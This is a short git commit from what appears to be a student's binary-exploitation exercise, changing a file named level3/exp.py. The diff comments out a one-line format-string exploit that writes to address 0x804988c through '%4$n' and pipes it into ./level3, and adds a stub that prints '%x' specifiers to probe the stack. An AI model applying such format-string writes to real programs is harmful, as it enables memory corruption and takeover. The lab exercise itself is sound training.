d8b6b6dbb2a55a2f032250aa2d058c044e83e431
AbdouBouallaga <babdelka@1337.student.ma>
2022-06-07 12:06:28 +0100

    update

--- level3/exp.py
+++ level3/exp.py
@@ -1,1 +1,9 @@
-(python -c "print '\x08\x04\x98\x8c'[::-1] + 'q'*60 + '%4\$n'"; cat) | ./level3
+#(python -c "print '\x08\x04\x98\x8c'[::-1] + 'q'*60 + '%4\$n'"; cat) | ./level3
+
+import struct
+
+mAddr = struct.pack("I", 0x804988c)
+
+padding = "%x "*64
+
+print padding
